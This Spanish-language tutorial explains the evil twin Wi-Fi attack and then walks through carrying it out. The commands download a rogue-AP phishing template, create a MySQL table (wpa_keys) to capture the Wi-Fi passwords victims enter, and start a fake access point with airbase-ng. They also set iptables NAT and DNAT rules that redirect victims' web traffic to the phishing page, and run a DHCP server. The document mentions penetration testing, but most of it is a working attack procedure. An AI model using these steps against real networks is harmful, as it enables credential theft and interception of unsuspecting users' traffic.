Ataque de tipo evil twin

Un ataque de tipo "Evil Twin" (Gemelo Malvado, en español) es una técnica utilizada en pruebas de penetración y en el ámbito de la ciberseguridad para comprometer la seguridad de las redes inalámbricas, como las redes Wi-Fi. Este tipo de ataque implica la creación de una red inalámbrica falsa que parece ser legítima, engañando a los usuarios y haciéndoles creer que están conectados a una red de confianza cuando, en realidad, están conectados a la red controlada por el atacante.

El proceso general de un ataque de Evil Twin suele involucrar los siguientes pasos:

1 - Identificación de una red objetivo:

El atacante identifica una red Wi-Fi legítima que desea emular o copiar. Esto podría ser una red abierta o protegida por una contraseña.

2 - Creación de una red falsa:

El atacante configura un punto de acceso inalámbrico con un nombre de red (SSID) y parámetros de seguridad que son idénticos o similares a la red legítima objetivo. Esto crea una red falsa que se parece mucho a la red real.

3 - Atracción de usuarios:

El atacante puede llevar a cabo estrategias para atraer a usuarios a su red falsa. Esto podría incluir configurar el punto de acceso cerca de la ubicación de la red legítima, aumentar la potencia de la señal, o incluso realizar un ataque de deautenticación para forzar a los dispositivos a buscar una nueva red para conectarse.

4 - Intercepción de tráfico:

Una vez que los usuarios se conectan a la red falsa, el atacante puede interceptar y analizar el tráfico de datos que pasa a través de su punto de acceso. Esto puede incluir la captura de contraseñas, datos personales o cualquier información confidencial transmitida por los usuarios.

5 - Posible redirección:

En algunos casos, el atacante puede redirigir el tráfico web de los usuarios a sitios web falsos o maliciosos para robar credenciales de inicio de sesión o distribuir malware.

Eviltwin descarga y uso de la plantilla

Nos dirigimos al directorio

ejecutamos:

wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip

movemos todo el fichero a la carpeta donde nos encontramos

mv Rogue_AP/* .

iniciamos los servicios apache2 y mysql

sudo service start apache2

sudo service start mysql

ahora en el localhost estará corriendo la plantilla que es totalmente personalisable

Eviltwin creación de base de datos en MYSQL

nos conectamos a la base de datos con

mysql -uroot

creamos una base de datos

create database rogue_AP;

usamos la base de datos

use rogue_AP;

creamos una tabla con 2 campos

create table wpa_keys(password1 varchar(32), password2 varchar(32));

procedemos a crear a el usuario

create user fakeap@localhost identified by 'fakeap';

asignamos al usuario fakeap todos los privilegios para acceder a la base de datos

grant all privileges on rogue_AP.* to 'fakeap'@'localhost';

ahora al ingresar la victima la contraseña podremos ver una plantilla de carga

Montando el punto de acceso con airbase

airbase-ng -e <WifiFree> -c 1 -P <wlan0mon>

-e El nombre del essid

-c El canal

-P La interface de red

Definicion de reglas con iptables y creacion de interfaces de red

debemos crear una interface de red siguiendo el fichero dhcpd.conf, para hacker esto debemos tener montado el falso punto de acceso

ifconfig at0 192.168.1.129 netmask 255.255.255.128

route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129

habilitar el enrutamiento por equipo

echo 1 > /proc/sys/net/ipv4/ip_forward

Antes de proceder a crear los iptables haremos una limpieza de las mismas

iptables --flush

iptables --table nat --flush

iptables --delete-chain

iptables --table nat --delete-chain

procedemos a crear los iptables

iptables --table nat --append POSTROUTING --out-interface <wlp3s0> -j MASQUERADE

iptables --append FORWARD --in-interface at0 -j ACCEPT

iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80

iptables -t nat -A POSTROUTING -j MASQUERADE

cd /etc/

creamos un fichero para que no nos de error

touch /var/lib/dhcp/dhcpd.leases

dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcp.pid at0
